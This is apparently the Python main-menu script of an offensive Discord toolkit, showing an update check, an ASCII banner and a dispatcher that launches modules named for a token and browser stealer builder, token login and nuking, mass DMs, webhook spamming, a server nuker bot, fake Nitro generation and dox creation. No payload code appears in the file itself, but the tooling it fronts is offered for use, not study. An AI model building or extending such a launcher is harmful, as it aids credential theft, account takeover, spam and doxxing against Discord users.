try:
 from Program.Config.Config import *
 from Program.Config.Util import *
 import requests
 import re
 import webbrowser
 Clear()
 url = url_config
 response = requests.get(url)
 if response.status_code == 200:
    content = response.text
    match = re.search(r'version_tool\s*=\s*"([^"]+)"', content)
    if match:
        current_version = match.group(1)
        if current_version != version_tool:
            print(f"{color.RED}[!] | Please download the new version of the tool ! {color.WHITE}{version_tool}{color.LIGHTYELLOW_EX} -> {color.WHITE}{current_version}{color.RED}")
            webbrowser.open_new_tab(github_tool)
            input(f"{color.RED}[!] | Enter to still use this version -> {color.RESET}")
            popup_version = f"{color.LIGHTYELLOW_EX}Please update the tool: {color.WHITE}{version_tool}{color.LIGHTYELLOW_EX} -> {color.WHITE}{current_version}{color.RED}"
        else:
            popup_version = ""
    else:
        popup_version = ""
 else:
    popup_version = ""
 while True:
   Clear()
   Title("Menu")
   print(color.RED + f"""    
                                                                                                                       
                             ██▀███  ▓█████ ▓█████▄    ▄▄▄█████▓ ██▓  ▄████ ▓█████  ██▀███
                            ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▓  ██▒ ▓▒▓██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
                            ▓██ ░▄█ ▒▒███   ░██   █▌   ▒ ▓██░ ▒░▒██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
                            ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌   ░ ▓██▓ ░ ░██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄
                            ░██▓ ▒██▒░▒████▒░▒████▓      ▒██▒ ░ ░██░░▒▓███▀▒░▒████▒░██▓ ▒██▒
                            ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒      ▒ ░░   ░▓   ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
                              ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒        ░     ▒ ░  ░   ░  ░ ░  ░  ░▒ ░ ▒░
                             ░░   ░    ░    ░ ░  ░      ░       ▒ ░░ ░   ░    ░     ░░   ░
                              ░        ░  ░   ░                 ░        ░    ░  ░   ░      
         
                                             {color.WHITE}{github_tool}
   {popup_version}
                                      
   {color.WHITE}[{color.RED}01{color.WHITE}] {color.RED}->{color.WHITE} Tool Info                      {color.WHITE}[{color.RED}11{color.WHITE}] {color.RED}->{color.WHITE} Discord Token To Id            {color.WHITE}[{color.RED}21{color.WHITE}] {color.RED}->{color.WHITE} Discord House Changer
   {color.WHITE}[{color.RED}02{color.WHITE}] {color.RED}->{color.WHITE} Web Site                       {color.WHITE}[{color.RED}12{color.WHITE}] {color.RED}->{color.WHITE} Discord Token Generator        {color.WHITE}[{color.RED}22{color.WHITE}] {color.RED}->{color.WHITE} Discord Nitro Generator
   {color.WHITE}[{color.RED}03{color.WHITE}] {color.RED}->{color.WHITE} Ip Localisation                {color.WHITE}[{color.RED}13{color.WHITE}] {color.RED}->{color.WHITE} Discord Token Info             {color.WHITE}[{color.RED}23{color.WHITE}] {color.RED}->{color.WHITE} Discord Server Nuker Bot (soon)
   {color.WHITE}[{color.RED}04{color.WHITE}] {color.RED}->{color.WHITE} Ip Pinger                      {color.WHITE}[{color.RED}14{color.WHITE}] {color.RED}->{color.WHITE} Discord Token Login            {color.WHITE}[{color.RED}24{color.WHITE}] {color.RED}->{color.WHITE} Discord Invite Bot To Id
   {color.WHITE}[{color.RED}05{color.WHITE}] {color.RED}->{color.WHITE} Ip Generator                   {color.WHITE}[{color.RED}15{color.WHITE}] {color.RED}->{color.WHITE} Discord Token Nuker            {color.WHITE}[{color.RED}25{color.WHITE}] {color.RED}->{color.WHITE} Dox Create
   {color.WHITE}[{color.RED}06{color.WHITE}] {color.RED}->{color.LIGHTYELLOW_EX} Discord/System/Browser Grab    {color.WHITE}[{color.RED}16{color.WHITE}] {color.RED}->{color.WHITE} Discord Mass Dm                {color.WHITE}[{color.RED}26{color.WHITE}] {color.RED}->{color.WHITE}
   {color.WHITE}[{color.RED}07{color.WHITE}] {color.RED}->{color.WHITE} Discord Webhook Generator      {color.WHITE}[{color.RED}17{color.WHITE}] {color.RED}->{color.WHITE} Discord Spam Message Channel   {color.WHITE}[{color.RED}27{color.WHITE}] {color.RED}->{color.WHITE}
   {color.WHITE}[{color.RED}08{color.WHITE}] {color.RED}->{color.WHITE} Discord Webhook Info           {color.WHITE}[{color.RED}18{color.WHITE}] {color.RED}->{color.WHITE} Discord Status Changer         {color.WHITE}[{color.RED}28{color.WHITE}] {color.RED}->{color.WHITE}
   {color.WHITE}[{color.RED}09{color.WHITE}] {color.RED}->{color.WHITE} Discord Webhook Spammer        {color.WHITE}[{color.RED}19{color.WHITE}] {color.RED}->{color.WHITE} Discord Language Changer       {color.WHITE}[{color.RED}29{color.WHITE}] {color.RED}->{color.WHITE}
   {color.WHITE}[{color.RED}10{color.WHITE}] {color.RED}->{color.WHITE} Discord Webhook Create         {color.WHITE}[{color.RED}20{color.WHITE}] {color.RED}->{color.WHITE} Discord Theme Changer          {color.WHITE}[{color.RED}30{color.WHITE}] {color.RED}->{color.WHITE}                                         
    
""")

   choice = input(f"{color.RED}-> {color.RESET}")

   if choice in ['1', '01']:
      StartProgram("ToolInfo.py")
   elif choice in ['2', '02']:
      StartProgram("WebSite.py")
   elif choice in ['3', '03']:
      StartProgram("IpLocalisation.py")
   elif choice in ['4', '04']:
      StartProgram("IpPinger.py")
   elif choice in ['5', '05']:
      StartProgram("IpGenerator.py")
   elif choice in ['6', '06']:
      StartProgram("StealerCreate.py")
   elif choice in ['7', '07']:
      StartProgram("DiscordWebhookGenerator.py")
   elif choice in ['8', '08']:
      StartProgram("DiscordWebhookInfo.py")
   elif choice in ['9', '09']:
      StartProgram("DiscordWebhookSpammer.py")
   elif choice in ['10']:
      StartProgram("DiscordWebhookCreate.py")
   elif choice in ['11']:
      StartProgram("DiscordTokenToId.py")
   elif choice in ['12']:
      StartProgram("DiscordTokenGenerator.py")
   elif choice in ['13']:
      StartProgram("DiscordTokenInfo.py")
   elif choice in ['14']:
      StartProgram("DiscordTokenLogin.py")
   elif choice in ['15']:
      StartProgram("DiscordTokenNuker.py")
   elif choice in ['16']:
      StartProgram("DiscordMassDm.py")
   elif choice in ['17']:
      StartProgram("DiscordSpamMessageChannel.py")
   elif choice in ['18']:
      StartProgram("DiscordStatusChanger.py")
   elif choice in ['19']:
      StartProgram("DiscordLanguageChanger.py")
   elif choice in ['20']:
      StartProgram("DiscordThemeChanger.py")
   elif choice in ['21']:
      StartProgram("DiscordHouseChanger.py")
   elif choice in ['22']:
      StartProgram("DiscordNitroGenerator.py")
   elif choice in ['23']:
      StartProgram("DiscordServerNukerBot.py")
   elif choice in ['24']:
      StartProgram("DiscordInviteBotToId.py")
   elif choice in ['25']:
      StartProgram("DoxCreate.py")
   elif choice in ['']:
      StartProgram("")
   elif choice in ['']:
      StartProgram("")
except:
   file = 'python ./Settings/Setup.py'
   subprocess.run(file, shell=True)



   